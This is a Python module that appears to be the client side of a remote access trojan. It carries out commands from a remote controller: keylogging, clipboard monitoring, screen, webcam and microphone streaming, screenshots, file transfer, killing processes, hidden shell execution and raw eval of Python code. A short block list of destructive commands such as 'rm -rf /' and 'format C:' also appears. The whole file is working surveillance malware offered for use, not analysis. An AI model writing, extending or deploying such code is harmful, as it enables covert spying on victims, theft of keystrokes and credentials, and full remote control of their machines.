"""
Command executor module
Handles execution of commands received from the controller
"""

import subprocess
import os
import time
import threading
import tempfile
from logging_utils import log_message
from dependencies import WINDOWS_AVAILABLE

def execute_command(command):
    """Execute a command and return the result."""
    try:
        log_message(f"Executing command: {command}")
        
        # Parse command
        command_parts = command.strip().split()
        if not command_parts:
            return "Empty command"
        
        main_command = command_parts[0].lower()
        
        # Handle special commands
        if main_command == "start_stream":
            return handle_start_stream(command_parts)
        elif main_command == "stop_stream":
            return handle_stop_stream(command_parts)
        elif main_command == "start_keylogger":
            return handle_start_keylogger(command_parts)
        elif main_command == "stop_keylogger":
            return handle_stop_keylogger(command_parts)
        elif main_command == "start_clipboard":
            return handle_start_clipboard(command_parts)
        elif main_command == "stop_clipboard":
            return handle_stop_clipboard(command_parts)
        elif main_command == "screenshot":
            return handle_screenshot(command_parts)
        elif main_command == "upload":
            return handle_file_upload(command_parts)
        elif main_command == "download":
            return handle_file_download(command_parts)
        elif main_command == "list_files":
            return handle_list_files(command_parts)
        elif main_command == "system_info":
            return handle_system_info(command_parts)
        elif main_command == "processes":
            return handle_processes(command_parts)
        elif main_command == "kill":
            return handle_kill_process(command_parts)
        elif main_command == "run":
            return handle_run_command(command_parts)
        elif main_command == "eval":
            return handle_eval_command(command_parts)
        elif main_command == "voice_playback":
            return handle_voice_playback(command_parts)
        elif main_command == "live_audio":
            return handle_live_audio(command_parts)
        else:
            # Execute as system command
            return execute_system_command(command)
    
    except Exception as e:
        error_msg = f"Command execution error: {e}"
        log_message(error_msg, "error")
        return error_msg

def handle_start_stream(command_parts):
    """Handle start streaming command."""
    try:
        stream_type = command_parts[1] if len(command_parts) > 1 else "screen"
        
        from streaming import get_or_create_agent_id
        agent_id = get_or_create_agent_id()
        
        if stream_type == "screen":
            from streaming import start_streaming
            success = start_streaming(agent_id)
        elif stream_type == "audio":
            from streaming import start_audio_streaming
            success = start_audio_streaming(agent_id)
        elif stream_type == "camera":
            from streaming import start_camera_streaming
            success = start_camera_streaming(agent_id)
        else:
            return f"Unknown stream type: {stream_type}"
        
        return f"Streaming {stream_type} {'started' if success else 'failed'}"
        
    except Exception as e:
        return f"Error starting stream: {e}"

def handle_stop_stream(command_parts):
    """Handle stop streaming command."""
    try:
        stream_type = command_parts[1] if len(command_parts) > 1 else "screen"
        
        if stream_type == "screen":
            from streaming import stop_streaming
            stop_streaming()
        elif stream_type == "audio":
            from streaming import stop_audio_streaming
            stop_audio_streaming()
        elif stream_type == "camera":
            from streaming import stop_camera_streaming
            stop_camera_streaming()
        else:
            return f"Unknown stream type: {stream_type}"
        
        return f"Streaming {stream_type} stopped"
        
    except Exception as e:
        return f"Error stopping stream: {e}"

def handle_start_keylogger(command_parts):
    """Handle start keylogger command."""
    try:
        from streaming import get_or_create_agent_id
        from input_handler import start_keylogger
        
        agent_id = get_or_create_agent_id()
        success = start_keylogger(agent_id)
        
        return f"Keylogger {'started' if success else 'failed'}"
        
    except Exception as e:
        return f"Error starting keylogger: {e}"

def handle_stop_keylogger(command_parts):
    """Handle stop keylogger command."""
    try:
        from input_handler import stop_keylogger
        stop_keylogger()
        return "Keylogger stopped"
        
    except Exception as e:
        return f"Error stopping keylogger: {e}"

def handle_start_clipboard(command_parts):
    """Handle start clipboard monitor command."""
    try:
        from streaming import get_or_create_agent_id
        from input_handler import start_clipboard_monitor
        
        agent_id = get_or_create_agent_id()
        success = start_clipboard_monitor(agent_id)
        
        return f"Clipboard monitor {'started' if success else 'failed'}"
        
    except Exception as e:
        return f"Error starting clipboard monitor: {e}"

def handle_stop_clipboard(command_parts):
    """Handle stop clipboard monitor command."""
    try:
        from input_handler import stop_clipboard_monitor
        stop_clipboard_monitor()
        return "Clipboard monitor stopped"
        
    except Exception as e:
        return f"Error stopping clipboard monitor: {e}"

def handle_screenshot(command_parts):
    """Handle screenshot command."""
    try:
        from dependencies import MSS_AVAILABLE, PIL_AVAILABLE
        
        if not MSS_AVAILABLE:
            return "Screenshot not available - mss module missing"
        
        import mss
        import base64
        
        with mss.mss() as sct:
            # Capture primary monitor
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            
            # Convert to PIL Image if available
            if PIL_AVAILABLE:
                from PIL import Image
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                
                # Save to temporary file
                temp_file = os.path.join(tempfile.gettempdir(), f"screenshot_{int(time.time())}.png")
                img.save(temp_file)
                
                return f"Screenshot saved: {temp_file}"
            else:
                # Save raw data
                temp_file = os.path.join(tempfile.gettempdir(), f"screenshot_{int(time.time())}.raw")
                with open(temp_file, 'wb') as f:
                    f.write(screenshot.bgra)
                
                return f"Screenshot saved (raw): {temp_file}"
        
    except Exception as e:
        return f"Screenshot error: {e}"

def handle_file_upload(command_parts):
    """Handle file upload command."""
    try:
        if len(command_parts) < 2:
            return "Usage: upload <local_file_path> [remote_path]"
        
        from file_handler import handle_file_upload
        success = handle_file_upload(command_parts)
        
        return f"File upload {'initiated' if success else 'failed'}"
        
    except Exception as e:
        return f"File upload error: {e}"

def handle_file_download(command_parts):
    """Handle file download command."""
    try:
        if len(command_parts) < 2:
            return "Usage: download <remote_file_path> [local_path]"
        
        from streaming import get_or_create_agent_id
        from file_handler import handle_file_download
        
        agent_id = get_or_create_agent_id()
        success = handle_file_download(command_parts, agent_id)
        
        return f"File download {'requested' if success else 'failed'}"
        
    except Exception as e:
        return f"File download error: {e}"

def handle_list_files(command_parts):
    """Handle list files command."""
    try:
        path = command_parts[1] if len(command_parts) > 1 else os.getcwd()
        
        from file_handler import list_directory
        items = list_directory(path)
        
        if items is None:
            return f"Cannot access directory: {path}"
        
        if not items:
            return f"Empty directory: {path}"
        
        result = f"Directory listing for {path}:\n"
        for item in items[:50]:  # Limit to 50 items
            item_type = "DIR" if item['is_directory'] else "FILE"
            size = f"{item['size']:,}" if not item['is_directory'] else ""
            result += f"{item_type:4} {size:>10} {item['name']}\n"
        
        if len(items) > 50:
            result += f"... and {len(items) - 50} more items"
        
        return result
        
    except Exception as e:
        return f"List files error: {e}"

def handle_system_info(command_parts):
    """Handle system info command."""
    try:
        from system_monitor import get_system_info
        
        info = get_system_info()
        
        result = "System Information:\n"
        
        # Platform info
        if 'platform' in info:
            platform = info['platform']
            result += f"OS: {platform.get('system', 'Unknown')} {platform.get('release', '')}\n"
            result += f"Machine: {platform.get('machine', 'Unknown')}\n"
            result += f"Node: {platform.get('node', 'Unknown')}\n"
        
        # CPU info
        if 'cpu' in info:
            cpu = info['cpu']
            result += f"CPU: {cpu.get('count', 'Unknown')} cores, {cpu.get('percent', 0):.1f}% usage\n"
        
        # Memory info
        if 'memory' in info:
            memory = info['memory']
            total_gb = memory.get('total', 0) / (1024**3)
            used_gb = memory.get('used', 0) / (1024**3)
            result += f"Memory: {used_gb:.1f}GB / {total_gb:.1f}GB ({memory.get('percent', 0):.1f}%)\n"
        
        # Disk info
        if 'disk' in info:
            disk = info['disk']
            total_gb = disk.get('total', 0) / (1024**3)
            used_gb = disk.get('used', 0) / (1024**3)
            result += f"Disk: {used_gb:.1f}GB / {total_gb:.1f}GB ({disk.get('percent', 0):.1f}%)\n"
        
        # Process count
        if 'processes' in info:
            result += f"Processes: {info['processes']}\n"
        
        # Uptime
        if 'uptime' in info:
            uptime_hours = info['uptime'] / 3600
            result += f"Uptime: {uptime_hours:.1f} hours\n"
        
        return result
        
    except Exception as e:
        return f"System info error: {e}"

def handle_processes(command_parts):
    """Handle processes command."""
    try:
        from system_monitor import get_running_processes
        
        processes = get_running_processes()
        
        # Sort by memory usage
        processes.sort(key=lambda p: p.get('memory', 0), reverse=True)
        
        result = f"Running Processes ({len(processes)} total):\n"
        result += f"{'PID':>8} {'Memory (MB)':>12} {'CPU%':>6} {'Name'}\n"
        result += "-" * 60 + "\n"
        
        # Show top 20 processes
        for proc in processes[:20]:
            memory_mb = proc.get('memory', 0) / (1024*1024)
            cpu_percent = proc.get('cpu_percent', 0)
            result += f"{proc.get('pid', 0):>8} {memory_mb:>12.1f} {cpu_percent:>6.1f} {proc.get('name', 'Unknown')}\n"
        
        if len(processes) > 20:
            result += f"... and {len(processes) - 20} more processes"
        
        return result
        
    except Exception as e:
        return f"Processes error: {e}"

def handle_kill_process(command_parts):
    """Handle kill process command."""
    try:
        if len(command_parts) < 2:
            return "Usage: kill <process_name_or_pid>"
        
        target = command_parts[1]
        
        from system_monitor import terminate_process_with_admin, terminate_process_by_pid
        
        # Try to parse as PID first
        try:
            pid = int(target)
            success = terminate_process_by_pid(pid, force=True)
            return f"Process {pid} {'terminated' if success else 'failed to terminate'}"
        except ValueError:
            # It's a process name
            success = terminate_process_with_admin(target, force=True)
            return f"Process {target} {'terminated' if success else 'failed to terminate'}"
        
    except Exception as e:
        return f"Kill process error: {e}"

def handle_run_command(command_parts):
    """Handle run command."""
    try:
        if len(command_parts) < 2:
            return "Usage: run <command>"
        
        # Join the rest of the command
        cmd = " ".join(command_parts[1:])
        
        return execute_system_command(cmd)
        
    except Exception as e:
        return f"Run command error: {e}"

def handle_eval_command(command_parts):
    """Handle eval command (Python code execution)."""
    try:
        if len(command_parts) < 2:
            return "Usage: eval <python_code>"
        
        # Join the rest as Python code
        code = " ".join(command_parts[1:])
        
        # Security warning: This is dangerous in production!
        result = eval(code)
        return str(result)
        
    except Exception as e:
        return f"Eval error: {e}"

def handle_voice_playback(command_parts):
    """Handle voice playback command."""
    try:
        if len(command_parts) < 2:
            return "Usage: voice_playback <text>"
        
        text = " ".join(command_parts[1:])
        
        # Text-to-speech functionality
        if WINDOWS_AVAILABLE:
            try:
                import win32com.client
                speaker = win32com.client.Dispatch("SAPI.SpVoice")
                speaker.Speak(text)
                return f"Played voice: {text[:50]}..."
            except ImportError:
                return "Text-to-speech not available (win32com missing)"
        else:
            # Linux TTS (espeak)
            try:
                subprocess.run(['espeak', text], check=True)
                return f"Played voice: {text[:50]}..."
            except (subprocess.CalledProcessError, FileNotFoundError):
                return "Text-to-speech not available (espeak missing)"
        
    except Exception as e:
        return f"Voice playback error: {e}"

def handle_live_audio(command_parts):
    """Handle live audio command."""
    try:
        if len(command_parts) < 2:
            return "Usage: live_audio <start|stop>"
        
        action = command_parts[1].lower()
        
        if action == "start":
            from streaming import get_or_create_agent_id, start_audio_streaming
            agent_id = get_or_create_agent_id()
            success = start_audio_streaming(agent_id)
            return f"Live audio {'started' if success else 'failed'}"
        elif action == "stop":
            from streaming import stop_audio_streaming
            stop_audio_streaming()
            return "Live audio stopped"
        else:
            return "Usage: live_audio <start|stop>"
        
    except Exception as e:
        return f"Live audio error: {e}"

def execute_system_command(command):
    """Execute a system command."""
    try:
        if WINDOWS_AVAILABLE:
            # Windows command execution
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            # Linux/Unix command execution
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
        
        output = result.stdout
        if result.stderr:
            output += f"\nSTDERR: {result.stderr}"
        
        if result.returncode != 0:
            output += f"\nReturn code: {result.returncode}"
        
        # Limit output size
        if len(output) > 4096:
            output = output[:4096] + "\n... (output truncated)"
        
        return output if output else "Command executed successfully (no output)"
        
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Command execution error: {e}"

def execute_command_async(command, callback=None):
    """Execute command asynchronously."""
    def async_executor():
        try:
            result = execute_command(command)
            if callback:
                callback(command, result, None)
        except Exception as e:
            if callback:
                callback(command, None, e)
    
    thread = threading.Thread(target=async_executor, daemon=True)
    thread.start()
    return thread

def get_command_history():
    """Get command execution history."""
    # This would typically be stored in a global list
    # For now, return empty list
    return []

def validate_command(command):
    """Validate command before execution."""
    if not command or not command.strip():
        return False, "Empty command"
    
    # Add security checks here if needed
    dangerous_commands = [
        'rm -rf /',
        'del /f /s /q C:\\',
        'format C:',
        'shutdown',
        'reboot'
    ]
    
    for dangerous in dangerous_commands:
        if dangerous.lower() in command.lower():
            return False, f"Dangerous command blocked: {dangerous}"
    
    return True, "Command valid"

def get_available_commands():
    """Get list of available commands."""
    commands = [
        "start_stream <screen|audio|camera> - Start streaming",
        "stop_stream <screen|audio|camera> - Stop streaming", 
        "start_keylogger - Start keylogger",
        "stop_keylogger - Stop keylogger",
        "start_clipboard - Start clipboard monitor",
        "stop_clipboard - Stop clipboard monitor",
        "screenshot - Take screenshot",
        "upload <file> [remote_path] - Upload file",
        "download <remote_file> [local_path] - Download file",
        "list_files [path] - List directory contents",
        "system_info - Get system information",
        "processes - List running processes",
        "kill <pid|name> - Terminate process",
        "run <command> - Execute system command",
        "eval <python_code> - Execute Python code",
        "voice_playback <text> - Text-to-speech",
        "live_audio <start|stop> - Control live audio"
    ]
    
    return "\n".join(commands)
